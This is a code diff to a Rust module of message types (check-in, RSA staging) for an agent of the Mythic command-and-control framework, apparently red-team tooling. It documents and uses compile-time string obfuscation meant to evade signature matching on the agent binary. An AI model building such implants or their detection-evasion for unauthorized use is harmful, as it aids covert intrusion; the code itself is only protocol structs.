@@ -1,37 +1,13 @@
-// use std::str::FromStr;
+//! Check-in and staging message types.
+//!
+//! These are sent in the clear (or under a static key) during the initial
+//! callback registration. Action strings are obfuscated at compile time to
+//! avoid trivial string matching on the agent binary.
 
 use serde::{Deserialize, Serialize};
-// use uuid::Uuid;
 
-// use crate::MythicError;
-
-pub const ACTION_STAGING_RSA: &str = "staging_rsa";
-pub const ACTION_STAGING_TRANSLATION: &str = "staging_translation";
-pub const ACTION_TRANSLATION_STAGING: &str = "translation_staging";
-pub const ACTION_GET_TASKING: &str = "get_tasking";
-pub const ACTION_POST_RESPONSE: &str = "post_response";
-
-/// Standard checkin request — matches the official Mythic JSON schema.
-///
-/// ```json
-/// {
-///     "action": "checkin",
-///     "uuid": "payload uuid",
-///     "ips": ["127.0.0.1"],
-///     "os": "macOS 10.15",
-///     "user": "its-a-feature",
-///     "host": "spooky.local",
-///     "pid": 4444,
-///     "architecture": "x64",
-///     "domain": "test",
-///     "integrity_level": 3,
-///     "external_ip": "8.8.8.8",
-///     "encryption_key": "base64 of key",
-///     "decryption_key": "base64 of key",
-///     "process_name": "osascript"
-/// }
-/// ```
-#[derive(Debug, Serialize, Deserialize, Default)]
+/// Initial check-in request sent by the agent to register a new callback.
+#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq)]
 pub struct ReqCheckin {
     pub action: String,
     pub uuid: String,
@@ -62,15 +38,17 @@ pub struct ReqCheckin {
 }
 
 impl ReqCheckin {
-    pub fn default(uuid: &str) -> Self {
-        let uuid = uuid.to_string();
+    /// Start a check-in for the given payload UUID; all other fields are empty.
+    pub fn for_uuid(uuid: &str) -> Self {
         Self {
             action: obfstring!("checkin"),
-            uuid,
+            uuid: uuid.to_string(),
             ..Default::default()
         }
     }
 
+    /// Full constructor. Prefer [`ReqCheckin::for_uuid`] + builder-style setters
+    /// when only a few fields are populated.
     #[allow(clippy::too_many_arguments)]
     pub fn new(
         uuid: &str,
@@ -87,10 +65,9 @@ impl ReqCheckin {
         decryption_key: Option<String>,
         process_name: Option<String>,
     ) -> Self {
-        let req = Self::default(uuid);
         Self {
-            action: req.action,
-            uuid: req.uuid,
+            action: obfstring!("checkin"),
+            uuid: uuid.to_string(),
             ips,
             os,
             user,
@@ -107,7 +84,8 @@ impl ReqCheckin {
     }
 }
 
-#[derive(Debug, Serialize, Deserialize)]
+/// Mythic's response to a successful check-in.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
 pub struct RespCheckin {
     pub action: String,
     pub id: String,
@@ -128,7 +106,8 @@ impl RespCheckin {
     }
 }
 
-#[derive(Debug, Serialize, Deserialize)]
+/// RSA staging request used during EKE (encrypted key exchange) setup.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
 pub struct ReqStagingRSA {
     pub action: String,
     pub pub_key: String,
@@ -145,7 +124,8 @@ impl ReqStagingRSA {
     }
 }
 
-#[derive(Debug, Serialize, Deserialize)]
+/// RSA staging response containing the AES session key.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
 pub struct RespStagingRSA {
     pub action: String,
     pub uuid: String,
